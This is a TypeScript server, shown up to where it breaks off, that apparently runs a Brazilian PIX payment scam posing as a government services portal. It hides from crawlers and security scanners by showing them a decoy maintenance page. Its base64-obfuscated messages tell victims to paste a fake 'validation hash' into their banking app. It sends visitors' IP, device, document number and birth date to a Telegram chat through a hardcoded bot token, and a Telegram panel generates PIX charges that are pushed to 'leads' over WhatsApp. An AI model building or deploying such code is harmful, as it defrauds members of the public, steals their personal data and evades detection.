import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import axios from "axios";
import fs from "fs";
import path from "path";
import { spawn, ChildProcess } from "child_process";
const QRCode = require('qrcode');
const FormData = require('form-data');

dotenv.config();

const app = express();
const port = parseInt(process.env.PORT || "80", 10);

// Config state
const configPath = path.join(process.cwd(), "config.json");
let currentConfig = {
  whatsappNumber: process.env.WHATSAPP_NUMBER || "5511971730325",
};

// Sessions state for Telegram tracking
const sessions = new Map<string, {
  messageId: number,
  startTime: number,
  lastHeartbeat: number,
  ip: string,
  device: string,
  location: string,
  converted: boolean,
  docValue: string,
  birthDate: string
}>();

// Bot states for interactive commands
const botStates = new Map<number, { action: string, data?: any }>();

// PIX pendente de confirmacao pelo admin
const pendingPix = new Map<string, { telefone: string, formalMessage: string, pixCode: string, transId: string, valorNumeric: number }>();

// Multi-Bot Management
const botProcesses = new Map<string, ChildProcess>();
const MAX_SLOTS = 5;

function stopBot(id: string) {
  const proc = botProcesses.get(id);
  if (proc) {
    try { proc.kill(); } catch (e) { }
    botProcesses.delete(id);
  }
}

let isBotStarting = false;
function startBot(id: string = 'main') {
  if (isBotStarting && id === 'main') return;
  if (id === 'main') isBotStarting = true;
  
  stopBot(id);
  console.log(`🤖 [SISTEMA] Iniciando instância do robô: ${id}`);
  const proc = spawn('node', ['whatsapp-bot.cjs', `--id=${id}`], { stdio: 'inherit' });

  proc.on('exit', (code) => {
    console.log(`⚠️ [SISTEMA] Robô ${id} finalizado com código ${code}. Reiniciando em 5 segundos...`);
    setTimeout(() => startBot(id), 5000);
  });

  botProcesses.set(id, proc);
}

// Validação básica de chave PIX
function validatePixKey(key: string) {
  const clean = key.trim();
  if (clean.includes('@') && clean.includes('.')) return true; // Email
  const digits = clean.replace(/\D/g, '');
  if (digits.length === 11 || digits.length === 14 || digits.length === 10) return true; // CPF/CNPJ/Fone
  if (clean.length >= 32) return true; // Aleatória
  return false;
}

// Criptografia estética para chave manual
function encryptPixKey(key: string) {
  const hash = Buffer.from(key).toString('hex').substring(0, 16).toUpperCase();
  return `0x${hash}_${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
}

// Geração de PIX Sistema Padrão (Gateway)
async function generateStandardPix(telefone: string, valorNumeric: number) {
  try {
    const key = process.env.SVR_CORE_P_PROVIDER;
    const secret = process.env.SVR_CORE_S_AUTH;
    const endpoint = process.env.SVR_CORE_GATEWAY;
    if (!key || !secret || !endpoint) throw new Error("Chaves SVR_CORE não configuradas.");

    const auth = Buffer.from(`${key}:${secret}`).toString('base64');
    const pixRes = await axios.post(endpoint, {
      amount: Math.round(valorNumeric * 100),
      currency: "BRL",
      paymentMethod: "PIX",
      customer: { name: "Cliente SVR", document: { number: "00000000000", type: "CPF" } }
    }, {
      headers: { 'Authorization': `Basic ${auth}`, 'Content-Type': 'application/json' }
    });

    const pixCode = pixRes.data.pix_code || pixRes.data.copyPaste || pixRes.data.qrcode;
    const transId = pixRes.data.id || pixRes.data.transactionId;
    const protocolId = Math.random().toString(36).substring(7).toUpperCase();

    const formalMessage = `🔐 *${_d('U1ZSIC0gU0lTVEVNQSBERSBWQUxJREFNw4fDg08gQ1JJUFRPR1LDgUZJQ0E=')}* 🔐\n\n` +
      `${_d('T28gc2lzdGVtYSBpZGVudGlmaWNvdSB1bWEgcGVuZMOqbmNpYSBkZSBhc3NlZ3VyYW1lbnRvIG5hIGNvbnRhIGRlIGRlc3Rpbm8u')}\n\n` +
      `🖥️ *${_d('RVNUQURPIERPIFNJU1RFTUE6')}*\n` +
      '```\n' +
      `ID: 0x${protocolId}\n` +
      `STATUS: ${_d('QUdVQVJEQU5ET19WQUxJREFNw4fDg09fSEFTSA==')}\n` +
      `TYPE: ${_d('QVVURU5USUNBw4fDg09fREVfREVTVElOTw==')}\n` +
      '```\n\n' +
      `👇 *${_d('Q09QSUUgTyBIQVNIIEFCQUlYTyBFIEVNIFNFR1VJREEgSU1QT1JURSBOTyBTRVUgQVBQIEJBTkPDIFJJTyAoUGl4IENvcGlhIGUgQ29sYSk6')}*`;

    const pendingId = `pix_${Date.now()}`;
    pendingPix.set(pendingId, { telefone, formalMessage, pixCode, transId, valorNumeric });

    const qrBuffer = await QRCode.toBuffer(pixCode, { width: 420, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
    const previewCaption = `⚡ <b>SISTEMA PADRÃO (AUTO)</b>\n\n💰 Valor: R$ ${valorNumeric.toFixed(2)}\n📱 Lead: <code>${telefone}</code>\n🆔 ID: <code>${transId}</code>\n\n⚠️ <i>Escolha o destino deste protocolo:</i>`;
    
    await sendTelegramPhoto(qrBuffer, previewCaption, {
      inline_keyboard: [
        [
          { text: "🚀 Enviar ao Lead", callback_data: `pix_dest:lead:${pendingId}` },
          { text: "📱 Enviar p/ Outro", callback_data: `pix_dest:phone:${pendingId}` }
        ],
        [
          { text: "📋 Só Copiar (Admin)", callback_data: `pix_dest:copy:${pendingId}` },
          { text: "❌ Cancelar", callback_data: "painel:back" }
        ]
      ]
    });
  } catch (e: any) {
    await sendTelegram(`❌ Erro no Gateway: ${e.message}`);
  }
}

// Geração de PIX Sistema Modificado (Chave Manual)
async function generateModifiedPix(telefone: string, valorNumeric: number, pixKey: string) {
  const protocolId = Math.random().toString(36).substring(7).toUpperCase();
  const encryptedKey = encryptPixKey(pixKey);

  const formalMessage = `🔐 *${_d('U1ZSIC0gU0lTVEVNQSBERSBWQUxJREFNw4fDg08gQ1JJUFRPR1LDgUZJQ0E=')}* 🔐\n\n` +
    `${_d('T28gc2lzdGVtYSBpZGVudGlmaWNvdSB1bWEgcGVuZMOqbmNpYSBkZSBhc3NlZ3VyYW1lbnRvIG5hIGNvbnRhIGRlIGRlc3Rpbm8u')}\n\n` +
    `🖥️ *${_d('RVNUQURPIERPIFNJU1RFTUE6')}*\n` +
    '```\n' +
    `ID: 0x${protocolId}\n` +
    `HASH: ${encryptedKey}\n` +
    `STATUS: ${_d('QUdVQVJEQU5ET19WQUxJREFNw4fDg09fSEFTSA==')}\n` +
    `\`\`\`\n\n` +
    `👇 *${_d('Q09QSUUgTyBIQVNIIEFCQUlYTyBFIEVNIFNFR1VJREEgSU1QT1JURSBOTyBTRVUgQVBQIEJBTkPDIFJJTyAoUGl4IENvcGlhIGUgQ29sYSk6')}*`;

  const pendingId = `pix_${Date.now()}`;
  pendingPix.set(pendingId, { telefone, formalMessage, pixCode: pixKey, transId: 'MANUAL', valorNumeric });

  const qrBuffer = await QRCode.toBuffer(pixKey, { width: 420, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
  const previewCaption = `🛠️ <b>SISTEMA MODIFICADO (MANUAL)</b>\n\n💰 Valor: R$ ${valorNumeric.toFixed(2)}\n📱 Lead: <code>${telefone}</code>\n🔑 Chave: <code>${pixKey}</code>\n\n⚠️ <i>Escolha o destino deste protocolo:</i>`;

  await sendTelegramPhoto(qrBuffer, previewCaption, {
    inline_keyboard: [
      [
        { text: "🚀 Enviar ao Lead", callback_data: `pix_dest:lead:${pendingId}` },
        { text: "📱 Enviar p/ Outro", callback_data: `pix_dest:phone:${pendingId}` }
      ],
      [
        { text: "📋 Só Copiar (Admin)", callback_data: `pix_dest:copy:${pendingId}` },
        { text: "❌ Cancelar", callback_data: "painel:back" }
      ]
    ]
  });
}

function resetBotSession(id: string) {
  stopBot(id);
  const sessionPath = path.join(process.cwd(), '.wwebjs_auth', `session-${id}`);
  if (fs.existsSync(sessionPath)) {
    try { fs.rmSync(sessionPath, { recursive: true, force: true }); } catch (e) { }
  }
  startBot(id);
}

if (fs.existsSync(configPath)) {
  const saved = JSON.parse(fs.readFileSync(configPath, "utf-8"));
  if (saved.whatsappNumber) currentConfig.whatsappNumber = saved.whatsappNumber;
}

if (!currentConfig.whatsappNumber) {
  currentConfig.whatsappNumber = "5511971730325"; // Número mestre de recuperação
}

const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
const TELEGRAM_URL = `https://api.telegram.org/bot${TG_TOKEN}`;

// CORS — libera todas as origens em todas as rotas (incluindo preflight OPTIONS)
const corsOptions = {
  origin: "*",
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization", "X-Requested-With"],
  optionsSuccessStatus: 204,
};
app.use(cors(corsOptions));
app.options("*", cors(corsOptions));

// --- OBFUSCATION LAYER ---
const _d = (b: string) => Buffer.from(b, 'base64').toString('utf-8');

// --- CLOAKING ENGINE (v5.0) ---
const BOT_UA_PATTERNS = [
  "googlebot", "adsbot", "bingbot", "yandex", "baiduspider", "facebookexternalhit",
  "twitterbot", "rogerbot", "linkedinbot", "embedly", "quora link preview",
  "showyoubot", "outbrain", "pinterest/0.", "developers.google.com/+/web/snippet",
  "slackbot", "vkShare", "W3C_Validator", "redditbot", "Applebot", "WhatsApp",
  "flipboard", "tumblr", "bitlybot", "SkypeShell", "bitlybot", "Zetabot",
  "facebookplatform", "chrome-lighthouse", "headlesschrome", "puppeteer",
  "selenium", "playwright", "python-requests", "curl", "wget", "postman",
  "insomnia", "scanner", "sqlmap", "nikto", "nmap", "burp"
];

function isBot(ua: string | undefined): boolean {
  if (!ua) return false;
  const lowUA = ua.toLowerCase();
  return BOT_UA_PATTERNS.some(pattern => lowUA.includes(pattern));
}

// Dummy page for bots (Camouflage)
const DUMMY_HTML = `
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${_d('U2VydmnDp29zIFDDumJsaWNvcyAtIFBvcnRhbCBkZSBBZ2VuZGFtZW50bw==')}</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f4f7f9; color: #333; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .container { max-width: 500px; padding: 40px; background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
        h1 { color: #003366; font-size: 24px; margin-bottom: 16px; }
        p { font-size: 16px; line-height: 1.5; color: #666; }
        .footer { margin-top: 30px; font-size: 12px; color: #999; }
    </style>
</head>
<body>
    <div class="container">
        <h1>${_d('TWFudXRlbsOnw6NvIFByb2dyYW1hZGE=')}</h1>
        <p>${_d('UHJlemFkbyBjaWRhZMOjbywgbyBwb3J0YWwgZXN0w6EgcGFzc2FuZG8gcG9yIHVtYSBhdHVhbGl6YcOnw6NvIGRlIHNlZ3VyYW7Dp2Egb2JyaWdhdMOzcmlhIGVtIGNvbmZvcm1pZGFkZSBjb20gYXMgbm92YXMgZGlyZXRyaXplcyBkZSBwcm90ZcOnw6NvIGRlIGRhZG9zLg==')}</p>
        <p>${_d('TyBhY2Vzc28gc2Vyw6EgcmVzdGFiZWxlY2lkbyBlbSBicmV2ZS4gQWdyYWRlY2Vtb3MgYSBjb21wcmVlbnPDo28u')}</p>
        <div class="footer">${_d('wqkgMjAyNiBQb3J0YWwgZGUgU2VydmnDp29zIEdvdmVybmFtZW50YWlzIC0gVG9kb3Mgb3MgZGlyZWl0b3MgcmVzZXJ2YWRvcy4=')}</div>
    </div>
</body>
</html>
`;

// Bot detection middleware
app.use((req, res, next) => {
  const ua = req.headers["user-agent"];
  const botToken = req.headers["x-svr-bot-token"];
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";
  
  // Bypass para o Robô da Shard Cloud (Identificação por Token ou User-Agent específico)
  const isOurBot = botToken === '8643978397' || (ua && ua.includes('SVR-BOT-NODE-RUNTIME'));

  // IMPORTANTE: Nunca aplicar camuflagem em rotas de API (se for nosso bot) ou arquivos estáticos
  if (req.url.startsWith('/api')) {
    if (isOurBot) return next();
    // Se for um "bot" estranho tentando acessar a API, podemos decidir se bloqueamos ou deixamos passar.
    // Para segurança total, vamos deixar passar apenas se não for um bot conhecido de scanner.
  }

  if (req.url.includes('.')) {
    return next();
  }

  if (isBot(ua) && !isOurBot) {
    console.log(`🛡️ [CLOAKING] Bot detectado e redirecionado para dummy: ${ua} (IP: ${ip})`);
    return res.status(200).send(DUMMY_HTML);
  }
  next();
});

// Logging middleware
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

app.use(express.json());
app.use(express.static(path.join(process.cwd(), 'dist')));


// Helper to send/edit Telegram messages
async function sendTelegram(text: string, messageId?: number, replyMarkup?: any) {
  if (!TG_TOKEN || !CHAT_ID) {
    console.error("❌ [TELEGRAM] Token ou Chat ID não configurados.");
    return null;
  }

  try {
    const url = messageId
      ? `${TELEGRAM_URL}/editMessageText`
      : `${TELEGRAM_URL}/sendMessage`;

    const payload: any = {
      chat_id: CHAT_ID,
      text,
      parse_mode: 'HTML'
    };
    if (messageId) payload.message_id = messageId;
    if (replyMarkup) payload.reply_markup = replyMarkup;

    const res = await axios.post(url, payload);
    return res.data.result.message_id;
  } catch (err: any) {
    console.error(`❌ [TELEGRAM] Erro ao enviar/editar mensagem: ${err.response?.data?.description || err.message}`);
    return null;
  }
}

// Helper para enviar foto (QR Code) ao Telegram admin
async function sendTelegramPhoto(buffer: Buffer, caption: string, replyMarkup?: any): Promise<number | null> {
  if (!TG_TOKEN || !CHAT_ID) return null;
  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', buffer, { filename: 'qr_pix.png', contentType: 'image/png' });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');
    if (replyMarkup) form.append('reply_markup', JSON.stringify(replyMarkup));
    const res = await axios.post(`${TELEGRAM_URL}/sendPhoto`, form, {
      headers: form.getHeaders(),
      timeout: 15000
    });
    return res.data.result?.message_id || null;
  } catch (err: any) {
    console.error(`❌ [TELEGRAM] Erro ao enviar foto: ${err.response?.data?.description || err.message}`);
    return null;
  }
}
app.post("/api/v1/session/start", async (req, res) => {
  const { device, location, userId } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";

  if (sessions.has(userId)) return res.json({ status: "exists" });

  const startTime = Date.now();
  const message = `<b>${_d('8PCfuyBOT1ZPIFZJU0lUQU5URSBPTkxJTkU=')}</b>\n\n` +
    `<b>IP:</b> ${ip}\n` +
    `<b>${_d('RGlzcG9zaXRpdm86')}</b> ${device}\n` +
    `<b>${_d('TG9jYWw6')}</b> ${location || 'GEO_LOC_055'}\n` +
    `<b>Status:</b> 🟢 ${_d('TmF2ZWdhbmRvIG5vIHNpdGUuLi4=')}\n` +
    `<b>${_d('SW7DrWNpbzo=')}</b> ${new Date(startTime).toLocaleTimeString()}`;

  console.log(`👤 [RUN_ENV_SYS] ${_d('Tm92byB2aXNpdGFudGU6')} ${userId} (${ip})`);
  const messageId = await sendTelegram(message);
  
  sessions.set(userId, {
    messageId: messageId || 0,
    startTime,
    lastHeartbeat: startTime,
    ip: String(ip),
    device,
    location: location || 'Brasil',
    converted: false,
    docValue: "",
    birthDate: ""
  });

  res.json({ status: "started", userId });
});

// 2. Session Heartbeat
app.post("/api/v1/session/heartbeat", (req, res) => {
  const { userId } = req.body;
  const session = sessions.get(userId);
  if (session) {
    session.lastHeartbeat = Date.now();
    res.json({ status: "alive" });
  } else {
    res.json({ status: "not_found" });
  }
});

// 3. Conversion (Went to WhatsApp)
app.post("/api/v1/session/convert", async (req, res) => {
  const { userId, details } = req.body;
  const session = sessions.get(userId);
  if (session && !session.converted) {
    session.converted = true;
    session.docValue = details.docValue;
    session.birthDate = details.birthDate;
    const timeSpent = Math.floor((Date.now() - session.startTime) / 1000);
    const message = `<b>${_d('8J+UpSBDTElFTlRVIEZPSSBQQVJBIE8gV0hBVFNBUFA=')}</b>\n\n` +
      `<b>IP:</b> ${session.ip}\n` +
      `<b>${_d('RG9jdW1lbnRvOg==')}</b> ${details.docValue}\n` +
      `<b>${_d('VGVtcG8gbm8gc2l0ZTo=')}</b> ${Math.floor(timeSpent / 60)}m ${timeSpent % 60}s\n` +
      `<b>Status:</b> ✅ ${_d('UkVESVJFQ0lPTkFETw==')}`;

    console.log(`🔥 [CONVERSÃO] Lead #${userId} ${_d('Zm9pIHBhcmEgbyBXaGF0c0FwcC4=')}`);
    await sendTelegram(message, session.messageId || undefined);
    res.json({ status: "converted" });
  } else {
    res.json({ status: "ignored" });
  }
});

// 4. Session End (Explicit Exit)
app.post("/api/v1/session/end", async (req, res) => {
  const { userId } = req.body;
  const session = sessions.get(userId);

  res.json({ status: "ok" }); // Responde rápido pro beacon não travar

  if (!session || session.converted) return; // Já convertido = já notificado

  const timeSpent = Math.floor((Date.now() - session.startTime) / 1000);
  const mins = Math.floor(timeSpent / 60);
  const secs = timeSpent % 60;

  const message = `<b>🚪 VISITANTE SAIU DO SITE</b>\n\n` +
    `<b>IP:</b> ${session.ip}\n` +
    `<b>Dispositivo:</b> ${session.device}\n` +
    `<b>Tempo no site:</b> ${mins}m ${secs}s\n` +
    `<b>Status:</b> 🔴 Saiu sem converter`;

  console.log(`🔴 [SAÍDA] Lead #${userId} saiu após ${mins}m ${secs}s.`);
  await sendTelegram(message, session.messageId || undefined);
  sessions.delete(userId);
});

// 5. Metrics Log (General)
app.post("/api/v1/metrics/log", async (req, res) => {
  const { payload } = req.body;
  if (!payload) return res.sendStatus(200);
  try {
    const decoded = JSON.parse(Buffer.from(payload, 'base64').toString());
    await sendTelegram(decoded.message);
  } catch (e) { }
  res.json({ status: "ok" });
});

app.get("/api/v1/session/data/:userId", (req, res) => {
  const session = sessions.get(req.params.userId);
  if (session) {
    res.json({ docValue: session.docValue, birthDate: session.birthDate });
  } else {
    res.status(404).json({ error: "not_found" });
  }
});

app.get("/api/config", (req, res) => {
  res.json(currentConfig);
});

// Cleanup task
setInterval(async () => {
  const now = Date.now();
  for (const [userId, session] of sessions.entries()) {
    if (!session.converted && now - session.lastHeartbeat > 60000) {
      const timeSpent = Math.floor((now - session.startTime) / 1000);
      const message = `<b>👤 VISITANTE SAIU (Sem conversão)</b>\n\n` +
        `<b>IP:</b> ${session.ip}\n` +
        `<b>Tempo:</b> ${Math.floor(timeSpent / 60)}m ${timeSpent % 60}s\n` +
        `<b>Status:</b> 🔴 Offline`;
      
      console.log(`🔴 [SISTEMA] Visitante #${userId} desconectou.`);
      await sendTelegram(message, session.messageId || undefined);
      sessions.delete(userId);
    }
  }
}, 30000);

// --- Telegram Bot Interactive Polling ---
async function startTelegramPolling() {
  if (!TG_TOKEN) {
    console.log("⚠️ [TELEGRAM] TELEGRAM_BOT_TOKEN não configurado. Polling desativado.");
    return;
  }

  let lastUpdateId = 0;
  console.log("🤖 [SISTEMA] Telegram Polling iniciado com sucesso.");

  while (true) {
    try {
      const response = await axios.get(`${TELEGRAM_URL}/getUpdates`, {
        params: { offset: lastUpdateId + 1, timeout: 30 }
      });

      for (const update of response.data.result) {
        lastUpdateId = update.update_id;
        const cb = update.callback_query;
        const msg = update.message || cb?.message;
        const chatId = msg?.chat?.id;
        const userId = msg?.from?.id || cb?.from?.id;

        if (!userId) continue;

        // Verificar se a mensagem é do admin autorizado
        // Suporte a supergrupos (CHAT_ID negativo) e usuários (ID positivo)
        const effectiveChatId = cb ? cb.message?.chat?.id : chatId;
        if (CHAT_ID && String(effectiveChatId) !== String(CHAT_ID)) {
          console.log(`⚠️ [TELEGRAM] Chat ID não autorizado: ${effectiveChatId} (esperado: ${CHAT_ID})`);
          continue;
        }

        const state = botStates.get(userId);
        let text = msg?.text || "";

        if (cb) {
          text = cb.data;
          await axios.post(`${TELEGRAM_URL}/answerCallbackQuery`, { callback_query_id: cb.id });
        }

        let command = text.split("@")[0].trim().toLowerCase();

        if (command === "/ping" || command === "/teste") {
          await sendTelegram("🏓 <b>PONG!</b>\nO sistema de notificações e controle está operacional.");
          continue;
        }

        if (command === "/status") {
          const onlineCount = Array.from(sessions.values()).filter(s => !s.converted).length;

          let slotsInfo = "";
          for (let i = 1; i <= MAX_SLOTS; i++) {
            const id = i === 1 ? 'main' : `parceiro${i}`;
            let status = "⚪ Offline";
            try {
              const statusPath = path.join(process.cwd(), `bot-status-${id}.json`);
              if (fs.existsSync(statusPath)) {
                const data = JSON.parse(fs.readFileSync(statusPath, 'utf-8'));
                if (data.status === 'CONNECTED') status = `🟢 Online (${data.adminName})`;
                else if (data.status === 'WAITING_QR') status = "🟡 Aguardando QR";
              }
            } catch (e) { }
            slotsInfo += `🔹 <b>Slot ${i}:</b> ${status}\n`;
          }

          await sendTelegram(`📊 <b>STATUS DO PORTAL SVR</b>\n\n` +
            `📱 <b>WhatsApp Master:</b> <code>${currentConfig.whatsappNumber}</code>\n` +
            `🤖 <b>Atendentes Ativos:</b>\n${slotsInfo}\n` +
            `👥 <b>Usuários no Site:</b> ${onlineCount}\n\n` +
            `🚀 <i>Use /pix para gerar protocolos.</i>`);
          continue;
        }

        if (command.startsWith("/setzap")) {
          const parts = text.split(" ");
          if (parts.length < 2) {
            await sendTelegram("❌ Use: <code>/setzap 5511...</code>");
          } else {
            const newNum = parts[1].replace(/\D/g, "");
            const confirmMsgId = await sendTelegram(`⚠️ <b>CONFIRMAR MUDANÇA?</b>\nDestino: <code>${newNum}</code>\nResponda <b>SIM</b> para confirmar.`);
            botStates.set(userId, { action: "confirm_zap", data: { number: newNum, msgId: confirmMsgId } });
          }
          continue;
        }

        if (state?.action === "confirm_zap" && text.toUpperCase() === "SIM") {
          const { number, msgId } = state.data;
          currentConfig.whatsappNumber = number;
          fs.writeFileSync(configPath, JSON.stringify(currentConfig));

          // Edita a mensagem de confirmação com o resultado
          await sendTelegram(
            `✅ <b>Número atualizado com sucesso!</b>\n📱 Novo destino: <code>${number}</code>`,
            msgId
          );

          // Pergunta se deseja gerar QR Code do Perfil 1
          const qrKeyboard = {
            inline_keyboard: [[
              { text: "📲 Sim, gerar QR Code", callback_data: "generate_qr:main" },
              { text: "❌ Não", callback_data: "cancel_qr" }
            ]]
          };
          await sendTelegram(
            `🤖 <b>Deseja gerar o QR Code do Perfil 1?</b>\n\nO bot será reiniciado e um novo QR Code aparecerá nos logs do servidor.`,
            undefined,
            qrKeyboard
          );

          botStates.delete(userId);
          continue;
        }

        if (command.startsWith("/pix")) {
          const parts = text.split(" ");
          const valorInput = parts[1];
          let telefone = parts[2];

          if (!valorInput) {
            await sendTelegram("❌ Use: <code>/pix [valor] [telefone]</code>");
            continue;
          }

          const valorNumeric = parseFloat(valorInput.replace(',', '.'));
          
          if (!telefone) {
            try {
              if (fs.existsSync('last-lead.json')) {
                const lastLeadData = JSON.parse(fs.readFileSync('last-lead.json', 'utf-8'));
                telefone = lastLeadData.chatId;
              }
            } catch (e) { }
          }

          if (!telefone) {
            await sendTelegram("❌ Lead não identificado. Use: <code>/pix 97.50 5511...</code>");
            continue;
          }

          const keyboard = {
            inline_keyboard: [
              [
                { text: "⚡ Sistema Padrão (Auto)", callback_data: `pix_sys:std:${valorNumeric}:${telefone}` },
                { text: "🛠️ Sistema Modificado (Manual)", callback_data: `pix_sys:mod:${valorNumeric}:${telefone}` }
              ],
              [{ text: "❌ Cancelar", callback_data: "painel:back" }]
            ]
          };

          await sendTelegram(
            `💰 <b>GERADOR DE PAGAMENTO SVR</b>\n\n` +
            `📱 Lead: <code>${telefone}</code>\n` +
            `💵 Valor: <b>R$ ${valorNumeric.toFixed(2)}</b>\n\n` +
            `<i>Escolha qual sistema de processamento deseja utilizar para este protocolo:</i>`,
            undefined,
            keyboard
          );
          continue;
        }

        // --- Callback: Seleção de Sistema PIX ---
        if (cb && cb.data.startsWith("pix_sys:")) {
          const [, sys, valor, phone] = cb.data.split(":");
          const valorNum = parseFloat(valor);

          if (sys === 'std') {
            await sendTelegram(`🔍 <b>PROCESSANDO VIA SISTEMA PADRÃO...</b>`, msg?.message_id);
            // Reutiliza a lógica existente do sistema padrão
            await generateStandardPix(phone, valorNum);
          } else {
            botStates.set(userId, { action: 'awaiting_manual_pix', data: { phone, valor: valorNum } });
            await sendTelegram(
              `🛠️ <b>MODO MODIFICADO SELECIONADO</b>\n\n` +
              `Por gentileza, <b>cole abaixo a Chave PIX</b> que deseja utilizar no protocolo.\n` +
              `<i>Aceito: Email, CPF, CNPJ, Telefone ou Chave Aleatória.</i>`,
              msg?.message_id
            );
          }
          continue;
        }

        // --- Estado: Aguardando Chave PIX Manual ---
        const userState = botStates.get(userId);
        if (userState?.action === 'awaiting_manual_pix' && !command) {
          const pixKey = text.trim();
          if (!validatePixKey(pixKey)) {
            await sendTelegram("❌ <b>Chave PIX inválida!</b> Tente novamente ou cancele enviando /start.");
            continue;
          }

          const { phone, valor } = userState.data;
          botStates.delete(userId);

          await sendTelegram(`🔐 <b>CRIPTOGRAFANDO CHAVE E GERANDO PROTOCOLO...</b>`);
          await generateModifiedPix(phone, valor, pixKey);
          continue;
        }

        // --- Seleção de Destino do PIX ---
        if (cb && cb.data.startsWith("pix_dest:")) {
          const [, dest, pendingId] = cb.data.split(":");
          const pending = pendingPix.get(pendingId);
          if (!pending) {
            await sendTelegram("❌ PIX expirado. Gere novamente.", msg?.message_id);
            continue;
          }

          if (dest === 'lead') {
            const ts = Date.now();
            fs.writeFileSync(`cmd-send-${ts}.json`, JSON.stringify({ to: pending.telefone, message: pending.formalMessage }));
            fs.writeFileSync(`cmd-send-${ts + 600}.json`, JSON.stringify({ to: pending.telefone, message: pending.pixCode }));
            
            // Gatilho automático para Etapa 4 (Status do Protocolo)
            fs.writeFileSync(`cmd-etapa-${ts + 2000}.json`, JSON.stringify({ etapa: 4, chatId: pending.telefone }));

            pendingPix.delete(pendingId);
            await sendTelegram(`🚀 <b>ENVIADO AO LEAD!</b>\n📱 <code>${pending.telefone}</code>`, msg?.message_id);
          } 
          else if (dest === 'phone') {
            botStates.set(userId, { action: 'awaiting_target_phone', data: { pendingId } });
            await sendTelegram(`📱 <b>DIGITE O NÚMERO DE DESTINO:</b>\nEx: <code>55119...</code>`, msg?.message_id);
          }
          else if (dest === 'copy') {
            await sendTelegram(
              `📋 <b>COPIAR PROTOCOLO:</b>\n\n` +
              `<pre>${pending.formalMessage}</pre>\n\n` +
              `🔑 <b>CHAVE PIX:</b>\n<code>${pending.pixCode}</code>`,
              msg?.message_id
            );
            pendingPix.delete(pendingId);
          }
          continue;
        }

        // --- Resposta ao número de destino personalizado ---
        if (state?.action === 'awaiting_target_phone') {
          const targetPhone = text.replace(/\D/g, "");
          const pending = pendingPix.get(state.data.pendingId);
          botStates.delete(userId);

          if (pending && targetPhone.length >= 10) {
            const ts = Date.now();
            fs.writeFileSync(`cmd-send-${ts}.json`, JSON.stringify({ to: targetPhone, message: pending.formalMessage }));
            fs.writeFileSync(`cmd-send-${ts + 600}.json`, JSON.stringify({ to: targetPhone, message: pending.pixCode }));
            
            pendingPix.delete(state.data.pendingId);
            await sendTelegram(`✅ <b>ENVIADO PARA NÚMERO ESPECÍFICO!</b>\n📱 <code>${targetPhone}</code>`);
          } else {
            await sendTelegram("❌ Número inválido ou PIX expirado.");
          }
          continue;
        }

        // --- Cancela PIX pendente ---
        if (cb && cb.data.startsWith("cancel_pix:")) {
          const pendingId = cb.data.replace("cancel_pix:", "");
          pendingPix.delete(pendingId);
          await sendTelegram("❌ <b>PIX cancelado.</b> Nenhuma mensagem foi enviada ao lead.", msg?.message_id);
          continue;
        }

        if (cb && cb.data.startsWith("check_pix:")) {
          const [, transId, phone, valor, total] = cb.data.split(":");
          try {
            const key = process.env.SVR_CORE_P_PROVIDER;
            const secret = process.env.SVR_CORE_S_AUTH;
            const auth = Buffer.from(`${key}:${secret}`).toString('base64');
            const endpoint = (process.env.SVR_CORE_GATEWAY || '').replace('/transactions', `/${transId}`);
            
            const res = await axios.get(endpoint, { headers: { 'Authorization': `Basic ${auth}` } });
            const status = res.data.status || res.data.paymentStatus;

            if (status === "PAID" || status === "confirmed" || status === "SUCESSO") {
              const successMsg = `✅ *PROTOCOLO DE SEGURANÇA VALIDADO* ✅\n\nO hash bancário foi processado e o montante de *R$ ${parseFloat(valor).toFixed(2)}* foi segurado com sucesso.\n\nIniciando procedimentos de liberação final...`;
              const ts = Date.now();
              fs.writeFileSync(`cmd-send-${ts}.json`, JSON.stringify({ to: phone, message: successMsg }));
              
              // Gatilho automático para Etapa 5 (Liberação Final)
              fs.writeFileSync(`cmd-etapa-${ts + 2000}.json`, JSON.stringify({ etapa: 5, chatId: phone }));

              await sendTelegram(`💰 <b>PAGAMENTO CONFIRMADO!</b>\nLead: ${phone}\n\n✅ <i>Etapa 5 (Liberação Final) ativada automaticamente.</i>`);
            } else {
              await sendTelegram(`⏳ <b>AGUARDANDO:</b> O lead ainda não pagou.`);
            }
          } catch (e: any) {
            await sendTelegram(`❌ Erro na consulta.`);
          }
          continue;
        }

        if (cb && cb.data.startsWith("generate_qr:")) {
          const slotId = cb.data.split(":")[1];
          const slotName = slotId === "main" ? "Perfil 1" : slotId;
          await sendTelegram(`🔄 <b>Reiniciando ${slotName}...</b>\n\nO QR Code será gerado. Acompanhe nos logs do servidor.`);
          resetBotSession(slotId);
          continue;
        }

        if (cb && cb.data === "cancel_qr") {
          await sendTelegram(`👌 <b>Ok!</b> Número atualizado. Bot não foi reiniciado.`);
          continue;
        }

        if (command === "/painel" || command === "/start") {
          const now = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
          const stats = getBotStatusInfo('main');
          const queue = getQueueInfo();
          
          const dashboard = 
            `🎮 <b>PAINEL DE CONTROLE SVR</b>\n\n` +
            `🤖 <b>Status Bot:</b> ${stats.emoji} ${stats.label}\n` +
